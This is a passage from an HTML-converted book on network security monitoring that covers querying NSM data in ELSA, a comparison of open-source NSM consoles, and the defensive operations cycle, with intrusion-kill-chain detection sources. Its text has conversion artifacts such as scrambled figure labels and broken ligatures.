<html><head></head><body>
<p class="calibre1"> <i class="calibre4">Figure 8-20: ELSA query window</i></p>
<p class="calibre1">To try out a sample query, I set my  <i class="calibre4">From</i> time to the beginning of the data </p>
<p class="calibre1">available using the pop-up calendar, and then enter <b class="calibre3">www.testmyids.com</b> in the </p>
<p class="calibre1">query box. I click <b class="calibre3">Submit Query</b> and see the results shown in Figure 8-21. </p>
<p class="calibre1"> <i class="calibre4">Figure 8-21: ELSA search results for </i> www .testmyids .com</p>
<p class="calibre1">Notice the program(2) element in the Field Summary section. This indi-</p>
<p class="calibre1">cates that ELSA identified two sources of data for these results. </p>
<p class="calibre1">Examining the records, we see the entries of program=bro_http and </p>
<p class="calibre1">program=bro_dns. When there are many different sources of data, we can use </p>
<p class="calibre1">this program element to narrow the results. For example, Figure 8-22 shows </p>
<p class="calibre1">what happens when I enter <b class="calibre3">192.168.2.127</b> in the query box, and then click </p>
<p class="calibre1">the program element. </p>
<p class="calibre1"> <i class="calibre4">Figure 8-22: ELSA results for 192.168.2.127 grouped by program</i></p>
<p class="calibre1">NSM Consoles   <b class="calibre3">179</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p214"/><img src="index-214_1.png" alt="Image 122" class="calibre2"/></p>
<p class="calibre1"><img src="index-214_2.png" alt="Image 123" class="calibre2"/></p>
<p class="calibre1">You can see that the results are grouped by program, with bro_conn </p>
<p class="calibre1">providing the most results (16,261) and bro_smtp the fewest (2). Clicking </p>
<p class="calibre1">any Count field starts a new query for just those results. For example, click </p>
<p class="calibre1">the <b class="calibre3">snort</b> link to see Snort alerts associated with 192.168.2.127, as shown in </p>
<p class="calibre1">Figure 8-23. (ELSA pulls these Snort alerts from the MySQL database.)</p>
<p class="calibre1"> <i class="calibre4">Figure 8-23: Some of the Snort alerts in ELSA associated with 192.168.2.127</i></p>
<p class="calibre1">Clicking bro_conn displays Bro’s connection logs, a form of session data </p>
<p class="calibre1">similar to that of Argus and PRADS, but generated by Bro. </p>
<p class="calibre1">ELSA supports other integrated NSM data as well. For example, to </p>
<p class="calibre1">generate a transcript in Snorby (as we did with CapMe in Figure 8-17), click </p>
<p class="calibre1">the <b class="calibre3">Info</b> link next to any record, click the <b class="calibre3">Plugin</b> drop-down menu, and </p>
<p class="calibre1">choose <b class="calibre3">getPcap</b>, as shown in Figure 8-24. </p>
<p class="calibre1"> <i class="calibre4">Figure 8-24: Choosing to retrieve full content  </i></p>
<p class="calibre1"> <i class="calibre4">data with CapMe in ELSA</i></p>
<p class="calibre1">This option takes you to the CapMe authentication screen, and you </p>
<p class="calibre1">can enter a username and password to retrieve a transcript for the event in </p>
<p class="calibre1">question. </p>
<p class="calibre1"><b class="calibre3">180</b>   Chapter 8</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p215"/>ELSA’s ability to manipulate log data makes for some interesting queries. </p>
<p class="calibre1">For example, to query for all HTTP POST events that did not involve servers </p>
<p class="calibre1">in the United States, you could submit the following:</p>
<p class="calibre1">+method:POST -country_code:US</p>
<p class="calibre1">Next, group the results by clicking the user_agent element of the Field </p>
<p class="calibre1">Summary. A sample of the results from my lab network is shown in Listing 8-3. </p>
<p class="calibre1">5724 Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0</p>
<p class="calibre1">2314 Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0</p>
<p class="calibre1">897  Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like </p>
<p class="calibre1">Gecko) Chrome/24.0.1312.57 Safari/537.17</p>
<p class="calibre1">788  -</p>
<p class="calibre1"><b class="calibre3">599  realms/1.0.2 CFNetwork/548.1.4 Darwin/11.0.0 </b>u</p>
<p class="calibre1">448  Dalvik/1.4.0 (Linux; U; Android 2.3.4; Kindle Fire Build/GINGERBREAD)</p>
<p class="calibre1">231  com.apple.Maps/1.0 iPhone OS/6.0.1</p>
<p class="calibre1"><b class="calibre3">227  village/1.16.1 CFNetwork/548.1.4 Darwin/11.0.0</b></p>
<p class="calibre1">129  Shockwave Flash</p>
<p class="calibre1"><b class="calibre3">85   Lost%20World/1.1.0 CFNetwork/548.1.4 Darwin/11.0.0</b></p>
<p class="calibre1"><b class="calibre3">76   BejBlitz/600 CFNetwork/609 Darwin/13.0.0</b></p>
<p class="calibre1"><b class="calibre3">68   JNPPirateSchool/1.0.6 CFNetwork/548.1.4 Darwin/11.0.0</b></p>
<p class="calibre1">49   Google Update/1.3.21.135;winhttp;cup</p>
<p class="calibre1"><b class="calibre3">48   PetCat/1.4 CFNetwork/548.1.4 Darwin/11.0.0</b></p>
<p class="calibre1"><b class="calibre3">36   Mailroom/1.7.5.1 CFNetwork/609.1.4 Darwin/13.0.0</b></p>
<p class="calibre1"><b class="calibre3">35   Paradise%20Cove/3.8 CFNetwork/548.1.4 Darwin/11.0.0</b></p>
<p class="calibre1">27   Mozilla/5.0 ZMTransaction/1.0</p>
<p class="calibre1">25   GoogleAnalytics/2.0b3 (iPad; U; CPU iPhone OS 5.1.1 like Mac OS X; en-us)</p>
<p class="calibre1"><b class="calibre3">24   TinyPetsies/1.5.3 CFNetwork/548.1.4 Darwin/11.0.0</b></p>
<p class="calibre1">17  Storm8/iPhone</p>
<p class="calibre1"> <i class="calibre4">Listing 8-3: ELSA query results for user_agent data</i></p>
<p class="calibre1">As you can tell from the bolded code, my kids like to play their iPad </p>
<p class="calibre1">and PC games on a segment monitored by this lab sensor! Each game lists </p>
<p class="calibre1">its name as part of the user agent, e.g., <b class="calibre3">realms</b> at u, which helps the identification process. Beware malicious code masquerading via fake user agents, </p>
<p class="calibre1">however. </p>
<p class="calibre1">Since ELSA has been integrated into SO only recently, analysts are just </p>
<p class="calibre1">beginning to appreciate its power. </p>
<p class="calibre1"><b class="calibre3">conclusion</b></p>
<p class="calibre1">This chapter surveyed the four main open source NSM consoles: Sguil, </p>
<p class="calibre1">Squert, Snorby, and ELSA. These consoles generally do not generate new </p>
<p class="calibre1">NSM data on their own. Rather, they provide an interface to NSM data sup-</p>
<p class="calibre1">plied by other tools. The consoles help analysts review and query for relevant </p>
<p class="calibre1">information, and then pivot to related data in an efficient manner. </p>
<p class="calibre1">NSM Consoles   <b class="calibre3">181</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p216"/>Sguil is the original NSM console, and many consider it to be the reference NSM platform. Its six main features are the core capabilities analysts </p>
<p class="calibre1">need when doing NSM operations. Sguil lacks some of the flexibility found </p>
<p class="calibre1">in new applications, however. Tools like Squert, Snorby, and ELSA are web-</p>
<p class="calibre1">accessible. Snorby even offers an app for the iOS platform. ELSA incorpo-</p>
<p class="calibre1">rates a much richer set of NSM data, although analysts continue to extend </p>
<p class="calibre1">the capabilities of Sguil to accept data from non-network sources such as </p>
<p class="calibre1">OSSEC. </p>
<p class="calibre1">By getting a sense of the interface and capabilities of each tool, as well </p>
<p class="calibre1">as the primary forms of data they manipulate, you can begin to imagine the </p>
<p class="calibre1">sorts of detection and response operations one can conduct with this rich </p>
<p class="calibre1">data on hand. Choose the tool that best suits your operational needs. In the </p>
<p class="calibre1">next chapter I will outline ways to put NSM to work in your environment by </p>
<p class="calibre1">describing NSM operations. </p>
<p class="calibre1"><b class="calibre3">182</b>   Chapter 8</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p217"/><b class="calibre3">Part IV</b></p>
<p class="calibre1"><b class="calibre3">N S M   i N   a c T i o N</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p218"/><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p219"/><b class="calibre3">9</b></p>
<p class="calibre1"><b class="calibre3">N S M   o P e r aT i o N S</b></p>
<p class="calibre1">Analysts need tools to find intruders, but </p>
<p class="calibre1">methodology is more important than soft-</p>
<p class="calibre1">ware. Tools collect and interpret data, but </p>
<p class="calibre1">methodology provides the conceptual model. </p>
<p class="calibre1">Analysts must understand how to use tools to achieve </p>
<p class="calibre1">a particular goal, but it’s important to start with a good </p>
<p class="calibre1">operational model, and then select tools to provide </p>
<p class="calibre1">data supporting that model. </p>
<p class="calibre1">Too many security organizations put tools before operations. They think </p>
<p class="calibre1">“we need to buy a log management system” or “I will assign one analyst </p>
<p class="calibre1">to antivirus duty, one to data leakage protection duty,” and so on. A tool-</p>
<p class="calibre1">driven team will not be effective as a mission-driven team. When the mis-</p>
<p class="calibre1">sion is defined by running software, analysts become captive to the features </p>
<p class="calibre1">and limitations of their tools. Analysts who think in terms of what they need </p>
<p class="calibre1">in order to accomplish their mission will seek tools to meet those needs, </p>
<p class="calibre1">and keep looking if their requirements aren’t met. Sometimes they even </p>
<p class="calibre1">decide to build their own tools. </p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p220"/>This chapter provides a foundation for developing an NSM operational model that will work for your organization. We’ll start with an overview of </p>
<p class="calibre1">the enterprise security cycle. </p>
<p class="calibre1"><b class="calibre3">The enterprise Security cycle</b></p>
<p class="calibre1">This book advocates NSM as an effective operational model. I define NSM </p>
<p class="calibre1">as the collection, analysis, and escalation of indications and warnings to </p>
<p class="calibre1">detect and respond to intrusions. This approach doesn’t explicitly address </p>
<p class="calibre1">planning activities or trying to resist intrusions. All four phases of the secu-</p>
<p class="calibre1">rity cycle—planning, resistance, detection, and response—are necessary </p>
<p class="calibre1">when protecting an organization from threats. Therefore, the first step in </p>
<p class="calibre1">building an operational model is to describe the relationships among plan-</p>
<p class="calibre1">ning, resistance, detection, and response, as shown in Figure 9-1 (a repro-</p>
<p class="calibre1">duction of Figure 1-1).1</p>
<p class="calibre1">IT mainly responsible, security assists</p>
<p class="calibre1">Plan</p>
<p class="calibre1">Resist</p>
<p class="calibre1">Prepare</p>
<p class="calibre1">Filter</p>
<p class="calibre1">Assess</p>
<p class="calibre1">Protect</p>
<p class="calibre1">Resolve</p>
<p class="calibre1">Escalate</p>
<p class="calibre1">Collect</p>
<p class="calibre1">Analyze</p>
<p class="calibre1">Respond</p>
<p class="calibre1">Detect</p>
<p class="calibre1">Security mainly responsible, IT assists</p>
<p class="calibre1"> <i class="calibre4">Figure 9-1: Enterprise security cycle</i></p>
<p class="calibre1">Figure 9-1 shows the relationships among the four core security activi-</p>
<p class="calibre1">ties. Although it depicts a smooth progression from one phase to the next, </p>
<p class="calibre1">in the real world, all four activities occur simultaneously because organiza-</p>
<p class="calibre1">tions often experience different intrusion states at once. IT and security </p>
<p class="calibre1">teams plan new defenses while existing countermeasures repel some intrud-</p>
<p class="calibre1">ers. While working to detect one set of intruders, CIRTs are responding to </p>
<p class="calibre1">other intruders already in the organization. </p>
<p class="calibre1">1. Elements of this cycle appeared in my 2010 presentation to SANS titled “CIRT-Level Response to Advanced Persistent Threat”  <i class="calibre4">(http://computer-forensics.sans.org/summit-archives/ </i></p>
<p class="calibre1"> <i class="calibre4">2010/31-bejtlich-cirt-level-response.pdf)</i>. </p>
<p class="calibre1"><b class="calibre3">186</b>   Chapter 9</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p221"/> <i class="calibre4"><b class="calibre3">The Planning Phase</b></i></p>
<p class="calibre1">The goal of the planning phase is to position the organization as effectively </p>
<p class="calibre1">as possible to resist intrusions, or to counter weaknesses being exploited </p>
<p class="calibre1">by ongoing intruder activity. In this phase, IT and security teams prepare </p>
<p class="calibre1">and assess the situation. They enable defense and evaluate its effectiveness. </p>
<p class="calibre1">Budgeting, auditing, compliance checks, training, secure software develop-</p>
<p class="calibre1">ment, and similar work occupy this phase. Adversary simulation, penetra-</p>
<p class="calibre1">tion testing, and red teaming are examples of assessment work. </p>
<p class="calibre1"><b class="calibre3">N o T e </b> <i class="calibre4"> The </i></p>
<p class="calibre1">Red Team Journal <i class="calibre4"> defines </i> red teaming <i class="calibre4"> as “the practice of viewing a problem</i> <i class="calibre4">from an adversary or competitor’s perspective” </i>(http://redteamjournal.com/</p>
<p class="calibre1">about/red-teaming-and-alternative-analysis/) <i class="calibre4">. In practice, this means engaging </i></p>
<p class="calibre1"> <i class="calibre4">one or more security professionals to conduct offensive operations against an organization in order to assess security measures. Adversary simulation is a form of red</i> <i class="calibre4">teaming where the operators seek to emulate the tools, techniques, and procedures of</i> <i class="calibre4">a selected threat group. </i> Penetration testing <i class="calibre4"> is sometimes used as a synonym for red</i> <i class="calibre4">teaming, although some consider penetration testing to be a technique used by the red</i> <i class="calibre4">team to achieve its overall goal. </i></p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">The Resistance Phase</b></i></p>
<p class="calibre1">During the resistance phase, IT and security teams filter and protect. </p>
<p class="calibre1">Automated countermeasures such as firewalls, antivirus, data-leakage pro-</p>
<p class="calibre1">tection, whitelisting, and related technologies designed to stop intruders </p>
<p class="calibre1">before they can gain unauthorized access to a network are parts of this </p>
<p class="calibre1">phase. </p>
<p class="calibre1">Security awareness training and configuration and vulnerability </p>
<p class="calibre1">management are other countermeasures designed to harden the human </p>
<p class="calibre1">and technical environment that also occur during the resistance phase. </p>
<p class="calibre1">Unfortunately, determined intruders eventually find at least one way into </p>
<p class="calibre1">a network, which makes the next two phases of the enterprise security </p>
<p class="calibre1">cycle—detection and response—mandatory. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">The Detection and Response Phases</b></i></p>
<p class="calibre1">The detection and response phases include three elements of NSM: collect, </p>
<p class="calibre1">analyze, and escalate. A fourth element, resolve, is part of the response </p>
<p class="calibre1">phase, but Figure 9-1 shows this particular element closer to the planning </p>
<p class="calibre1">element of the enterprise security cycle. </p>
<p class="calibre1">The detection and response phases of the enterprise security cycle are </p>
<p class="calibre1">at the heart of NSM, and they are the reason analysts perform collection, </p>
<p class="calibre1">analysis, and escalation to detect and respond to intrusions. Accordingly, </p>
<p class="calibre1">they deserve their own diagram showing how the various elements work </p>
<p class="calibre1">together. Figure 9-2 depicts that relationship, and the following section </p>
<p class="calibre1">explains these elements in more detail. </p>
<p class="calibre1">NSM Operations   <b class="calibre3">187</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p222"/>DETECTION</p>
<p class="calibre1">RESPONSE</p>
<p class="calibre1">Collection</p>
<p class="calibre1">Analysis</p>
<p class="calibre1">Escalation</p>
<p class="calibre1">Resolution</p>
<p class="calibre1">Host data</p>
<p class="calibre1">Constituent </p>
<p class="calibre1">C</p>
<p class="calibre1">A</p>
<p class="calibre1">A</p>
<p class="calibre1">notification</p>
<p class="calibre1">O</p>
<p class="calibre1">IOC-centric </p>
<p class="calibre1">Constituent </p>
<p class="calibre1">N</p>
<p class="calibre1">N</p>
<p class="calibre1">N</p>
<p class="calibre1">Net data</p>
<p class="calibre1">response</p>
<p class="calibre1">A</p>
<p class="calibre1">analysis, or </p>
<p class="calibre1">A</p>
<p class="calibre1">S</p>
<p class="calibre1">L</p>
<p class="calibre1">L</p>
<p class="calibre1">T</p>
<p class="calibre1">Y</p>
<p class="calibre1">“matching” </p>
<p class="calibre1">Y</p>
<p class="calibre1">New IOC </p>
<p class="calibre1">I</p>
<p class="calibre1">Application</p>
<p class="calibre1">Additional </p>
<p class="calibre1">S</p>
<p class="calibre1">S</p>
<p class="calibre1">creation</p>
<p class="calibre1">T</p>
<p class="calibre1">T</p>
<p class="calibre1">T</p>
<p class="calibre1">logs</p>
<p class="calibre1">response</p>
<p class="calibre1"/>
<p class="calibre1"/>
<p class="calibre1">UE</p>
<p class="calibre1">C</p>
<p class="calibre1">C</p>
<p class="calibre1">New </p>
<p class="calibre1">N</p>
<p class="calibre1">O</p>
<p class="calibre1">O</p>
<p class="calibre1">T</p>
<p class="calibre1">Data from</p>
<p class="calibre1">Collection </p>
<p class="calibre1">N</p>
<p class="calibre1">N</p>
<p class="calibre1"/>
<p class="calibre1">collection </p>
<p class="calibre1">S</p>
<p class="calibre1">S</p>
<p class="calibre1">P</p>
<p class="calibre1">third party</p>
<p class="calibre1">improvement</p>
<p class="calibre1">O</p>
<p class="calibre1">IOC-free </p>
<p class="calibre1">O</p>
<p class="calibre1">requirement</p>
<p class="calibre1">O</p>
<p class="calibre1">L</p>
<p class="calibre1">L</p>
<p class="calibre1">analysis, or </p>
<p class="calibre1">R</p>
<p class="calibre1">E</p>
<p class="calibre1">E</p>
<p class="calibre1">T</p>
<p class="calibre1">Data from </p>
<p class="calibre1">Analysis </p>
<p class="calibre1">(S)</p>
<p class="calibre1">“hunting” </p>
<p class="calibre1">(S) New analysis </p>
<p class="calibre1">A</p>
<p class="calibre1">requirement</p>
<p class="calibre1">L</p>
<p class="calibre1">constituent</p>
<p class="calibre1">improvement</p>
<p class="calibre1">Event observed/</p>
<p class="calibre1">Identification</p>
<p class="calibre1">Validation</p>
<p class="calibre1">Documentation</p>
<p class="calibre1">Notification</p>
<p class="calibre1">Ack</p>
<p class="calibre1">Containment</p>
<p class="calibre1">Remediation</p>
<p class="calibre1">stored</p>
<p class="calibre1">Request more data</p>
<p class="calibre1"> <i class="calibre4">Figure 9-2: NSM process</i></p>
<p class="calibre1"><b class="calibre3">collection, analysis, escalation, and resolution</b></p>
<p class="calibre1">The detection and response phases include the following elements:</p>
<p class="calibre1"><b class="calibre3">Collection</b>  Gathering the data we need to decide whether activity is </p>
<p class="calibre1">normal, suspicious, or malicious. </p>
<p class="calibre1"><b class="calibre3">Analysis</b>  The process of validating what we suspect about the nature </p>
<p class="calibre1">of an event. As Figure 9-2 shows, there are two types of analysis: that </p>
<p class="calibre1">which is focused on indicators of compromise (IOCs), and that which </p>
<p class="calibre1">is not. (IOCs are discussed in “Analysis” o<a href="#p227">n page 193. </a>)</p>
<p class="calibre1"><b class="calibre3">Escalation</b>  The act of notifying a constituent about the status of a </p>
<p class="calibre1">compromised asset. (I advocate using the term constituent because </p>
<p class="calibre1">it captures the theme that those the CIRT serves have a “vote” in the </p>
<p class="calibre1">CIRT’s operations, because constituents own the computers monitored </p>
<p class="calibre1">by the CIRT.) </p>
<p class="calibre1"><b class="calibre3">Resolution</b>  The action taken by a constituent or security team mem-</p>
<p class="calibre1">ber to reduce the risk of loss. </p>
<p class="calibre1">As with the diagram of the enterprise security cycle in Figure 9-1, the </p>
<p class="calibre1">workflow in Figure 9-2 appears orderly and linear, but that’s typically not the </p>
<p class="calibre1">case in real life. In fact, all phases of the detection and response processes </p>
<p class="calibre1">may occur at the same time. Sometimes, multiple incidents are occurring; </p>
<p class="calibre1">other times, the same incident occupies all four stages at once. Figure 9-2 </p>
<p class="calibre1">shows that detection is composed of collection and analysis, and response </p>
<p class="calibre1">includes escalation and resolution. Let’s take a closer look at each of these </p>
<p class="calibre1">elements. </p>
<p class="calibre1"><b class="calibre3">188</b>   Chapter 9</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p223"/> <i class="calibre4"><b class="calibre3">Collection</b></i></p>
<p class="calibre1">Collection includes various processes that gather information, both techni-</p>
<p class="calibre1">cal and nontechnical:</p>
<p class="calibre1"><b class="calibre3">Technical processes</b>  Involves gathering data from endpoints or hosts </p>
<p class="calibre1">(such as computers, servers, tablets, mobile devices, and so on), the net-</p>
<p class="calibre1">work, and logs (created by applications, devices, and related sources). </p>
<p class="calibre1"><b class="calibre3">Nontechnical collection processes</b>  Includes recording input from </p>
<p class="calibre1">third parties (outsiders like partners, law enforcement, intelligence </p>
<p class="calibre1">agencies, and so on) and constituents. </p>
<p class="calibre1"><b class="calibre3">technical Sources</b></p>
<p class="calibre1">One way to gather data from hosts is to use a commercial enterprise-class </p>
<p class="calibre1">platform like Mandiant for Intelligent Response (MIR,  <i class="calibre4">http://www.mandiant </i></p>
<p class="calibre1"> <i class="calibre4">.com/products/mandiant-platform/intelligent-response/</i>), which asks questions of endpoints via software. MIR enables CIRTs to  <i class="calibre4">sweep</i> the enterprise for signs </p>
<p class="calibre1">of intruder activity, and then conduct targeted analysis of potential victim </p>
<p class="calibre1">computers. Other options include the commercial version of F-Response </p>
<p class="calibre1">( <i class="calibre4">http://www.f-response.com/</i>), which allows basic remote access to hard drives and memory, as well as native Windows tools such as Windows Management </p>
<p class="calibre1">Instrumentation Command-line (WMIC) and SysInternals PsExec.2</p>
<p class="calibre1">Network-centric collection is the focus of this book. The network access </p>
<p class="calibre1">methods discussed in Chapter 2, along with the platforms described in </p>
<p class="calibre1">Part II, and the tools introduced in Part III, combine to offer network-</p>
<p class="calibre1">derived data to analysts. Additional layers of interpretation transform raw </p>
<p class="calibre1">network information into indicators that merit attention. </p>
<p class="calibre1">Application logs are a primary source of technical data in the collection </p>
<p class="calibre1">phase, and any application or device that generates them can provide valu-</p>
<p class="calibre1">able information. Output from an antivirus agent and the Apache process </p>
<p class="calibre1">on a web server are examples of application logs. </p>
<p class="calibre1">Log collection requires at least the following:</p>
<p class="calibre1">•  A  <i class="calibre4">log source</i> that creates application data</p>
<p class="calibre1">•  A  <i class="calibre4">log collector</i> that accepts and stores the data</p>
<p class="calibre1">•  A  <i class="calibre4">transport method</i> to move the logs from the source to the collector</p>
<p class="calibre1">For example, ELSA might collect logs from a proxy server, with Syslog </p>
<p class="calibre1">acting as the transport method. </p>
<p class="calibre1">Host data differs from application logs in that host data is often acquired </p>
<p class="calibre1">on demand, while logs are created by a regularly scheduled process. Using </p>
<p class="calibre1">MIR, for example, you can remotely query for host data like a mutex in </p>
<p class="calibre1">memory or an artifact in the Windows Registry. This concept of interrogat-</p>
<p class="calibre1">ing computers for specific indicators of compromise (IOCs, discussed in </p>
<p class="calibre1">“Analysis” o<a href="#p227">n page 193</a>) is a powerful host-centric technique. </p>
<p class="calibre1">2. Mike Pilkington’s posts to the SANS forensics blog are especially helpful:  <i class="calibre4">http:// </i></p>
<p class="calibre1"> <i class="calibre4">computer-forensics.sans.org/blog/author/mpilkington</i>. </p>
<p class="calibre1">NSM Operations   <b class="calibre3">189</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p224"/><b class="calibre3">Nontechnical Sources</b></p>
<p class="calibre1">Nontechnical sources can be even more important to the success of the </p>
<p class="calibre1">NSM process. For example, the 2013 edition of the Mandiant M-Trends </p>
<p class="calibre1">report ( <i class="calibre4">http://www.mandiant.com/resources/m-trends/</i>) noted that organiza-</p>
<p class="calibre1">tions received warning of intrusions from external parties two-thirds of the </p>
<p class="calibre1">time; only one-third of the time did they discover the event themselves. </p>
<p class="calibre1">When identifying an event using internal sources, reports from users </p>
<p class="calibre1">are often crucial. Users trained to be aware of phishing activity can be a </p>
<p class="calibre1">key aspect of enterprise defense. The user who reports a failed phishing </p>
<p class="calibre1">attempt may provide the warning and evidence needed to detect when that </p>
<p class="calibre1">same attempt succeeded against another victim. </p>
<p class="calibre1"><b class="calibre3">whaT DaTa ShoulD you collecT? </b></p>
<p class="calibre1">This book recommends collecting several classes of network-centric data . This </p>
<p class="calibre1">NSM data includes full content, extracted content, session data, transaction </p>
<p class="calibre1">data, statistical data, metadata, and alert data . Is al  that necessary? How </p>
<p class="calibre1">should a CIRT decide what data to col ect to improve its chances of detecting </p>
<p class="calibre1">and responding to all sorts of digital intruders? </p>
<p class="calibre1">Eric M . Hutchins, Michael J . Cloppert, and Rohan M . Amin offer one model </p>
<p class="calibre1">to help answer this question in their landmark paper “Intel igence-Driven Com-</p>
<p class="calibre1">puter Network Defense Informed by Analysis of Adversary Campaigns and </p>
<p class="calibre1">Intrusion Kill Chains” ( <i class="calibre4">ht p://papers.rohanamin.com/wp-content/uploads/papers </i></p>
<p class="calibre1"> <i class="calibre4">.rohanamin.com/2011/08/iciw2011.pdf </i>) . In this paper (and in talks at conferences), they outline the steps an intruder takes when exercising a certain set of </p>
<p class="calibre1">tactics, techniques, and procedures (TTPs, a term borrowed from the US military </p>
<p class="calibre1">to characterize intruder activity) . Although the authors developed their model to </p>
<p class="calibre1">counter advanced persistent threat (APT) TTPs, </p>
<p class="calibre1">this general form of analysis can be adapted to </p>
<p class="calibre1">Intrusion Kill Chain</p>
<p class="calibre1">suit other actors and other methods . (For more </p>
<p class="calibre1">information on the APT, see Mandiant’s report at </p>
<p class="calibre1">Reconnaissance</p>
<p class="calibre1"> <i class="calibre4">ht p://www.mandiant.com/apt1/</i> .) Their model </p>
<p class="calibre1">appears in Figure 9-3, and is referenced in </p>
<p class="calibre1">Weaponization</p>
<p class="calibre1">their paper as an  <i class="calibre4">intrusion kil  chain</i> . </p>
<p class="calibre1">Delivery</p>
<p class="calibre1">This series of steps resembles the process </p>
<p class="calibre1">discussed in previous works, such as the “phases </p>
<p class="calibre1">Exploitation</p>
<p class="calibre1">of compromise” in my first book  <i class="calibre4">The Tao of </i></p>
<p class="calibre1"> <i class="calibre4">Network Security Monitoring: Beyond Intrusion </i></p>
<p class="calibre1">Installation</p>
<p class="calibre1"> <i class="calibre4">Detection </i>(Addison-Wesley, 2004): (1) recon-</p>
<p class="calibre1">Command and control</p>
<p class="calibre1">naissance, (2) exploitation, (3) reinforce-</p>
<p class="calibre1">ment, (4) consolidation, and (5) pil age . The </p>
<p class="calibre1">Actions on intent</p>
<p class="calibre1">“anatomy of a hack” from  <i class="calibre4">Hacking Exposed, </i></p>
<p class="calibre1"> <i class="calibre4">Fourth Edition</i> (McGraw-Hill Osborne Media, </p>
<p class="calibre1"> <i class="calibre4">Figure 9-3: Intrusion kill </i></p>
<p class="calibre1">2003) is similar: (1) footprinting, (2) scanning, </p>
<p class="calibre1"> <i class="calibre4">chain model</i></p>
<p class="calibre1"><b class="calibre3">190</b>   Chapter 9</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p225"/>(3) enumeration, (4) gaining access, (5) escalating privilege, (6) pilfering, (7) covering tracks, (8) creating backdoors . Others have their own versions </p>
<p class="calibre1">of the steps taken by an adversary when compromising a target . </p>
<p class="calibre1">What makes the approach offered by Hutchins, Cloppert, and Amin unique </p>
<p class="calibre1">is its focus on aligning one’s security program with the steps in the intrusion </p>
<p class="calibre1">kill chain . They show example technologies to detect, deny, disrupt, degrade, </p>
<p class="calibre1">and/or deceive the adversary . NSM fits this model wel , because it provides a </p>
<p class="calibre1">way to detect and respond to intruders before they accomplish their mission . </p>
<p class="calibre1">Therefore, the intrusion kill chain offers a powerful model for identifying the </p>
<p class="calibre1">data we need to col ect . </p>
<p class="calibre1">The most robust NSM operation will have a detection method for each </p>
<p class="calibre1">step in the intrusion kill chain, with data sources that vary according to the net-</p>
<p class="calibre1">work . Figure 9-4 shows the intrusion kill chain with sample data sources, includ-</p>
<p class="calibre1">ing host, network, application, and nontechnical . </p>
<p class="calibre1">Intrusion Kill Chain</p>
<p class="calibre1">Detection Method</p>
<p class="calibre1">Reconnaissance</p>
<p class="calibre1">Web access logs</p>
<p class="calibre1">Weaponization</p>
<p class="calibre1">Extracted content</p>
<p class="calibre1">Delivery</p>
<p class="calibre1">User report</p>
<p class="calibre1">Exploitation</p>
<p class="calibre1">Endpoint assessment</p>
<p class="calibre1">Installation</p>
<p class="calibre1">Endpoint assessment</p>
<p class="calibre1">Command and control</p>
<p class="calibre1">Transaction data</p>
<p class="calibre1">Actions on intent</p>
<p class="calibre1">Memory analysis</p>
<p class="calibre1"> <i class="calibre4">Figure 9-4: Intrusion kill chain and possible detection </i></p>
<p class="calibre1"> <i class="calibre4">sources and methods</i></p>
<p class="calibre1">To understand Figure 9-4, suppose that an intruder wants to compromise </p>
<p class="calibre1">a certain company in order to steal data . He decides to conduct a spear phish-</p>
<p class="calibre1">ing attack to gain initial access to the target . To identify users at the company, </p>
<p class="calibre1">he downloads all documents from the company’s website that contain email </p>
<p class="calibre1">addresses of company users . The intruder crafts an enticing phishing email, </p>
<p class="calibre1">inserts exploit code into an at achment, and transmits the malicious message to a </p>
<p class="calibre1">set of users at the company . Once a victim user clicks the malicious attachment, </p>
<p class="calibre1">which is malware that will exploit a vulnerability in the user’s word processing </p>
<p class="calibre1">application, the malware establishes an outbound command-and-control chan-</p>
<p class="calibre1">nel to a site control ed by the intruder . At that point, the intruder is ready to </p>
<p class="calibre1">begin looking for the data he wants to steal . </p>
<p class="calibre1"> <i class="calibre4">(continued)</i></p>
<p class="calibre1">NSM Operations   <b class="calibre3">191</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p226"/>Figure 9-4 shows how various sources and methods could be used to </p>
<p class="calibre1">detect each phase of the intrusion kill chain . The CIRT could analyze access </p>
<p class="calibre1">logs to detect an intruder using a search engine to find email addresses on the </p>
<p class="calibre1">company’s website . As the phishing message passes through the company’s </p>
<p class="calibre1">email servers, automated processing software could extract the malicious at ach-</p>
<p class="calibre1">ment and analyze it for suspicious features . One or more recipients of the phish-</p>
<p class="calibre1">ing message could report receiving it . </p>
<p class="calibre1">The CIRT could use an endpoint assessment tool to find indicators of com-</p>
<p class="calibre1">promise created by the exploitation of a vulnerable word processing applica-</p>
<p class="calibre1">tion and the instal ation of malware that fol ows . The CIRT could observe the </p>
<p class="calibre1">command-and-control channel in transaction data col ected by its SO platform . </p>
<p class="calibre1">Final y, to see individual commands executed by the intruder, the CIRT might </p>
<p class="calibre1">analyze memory captured from one or more victim systems . </p>
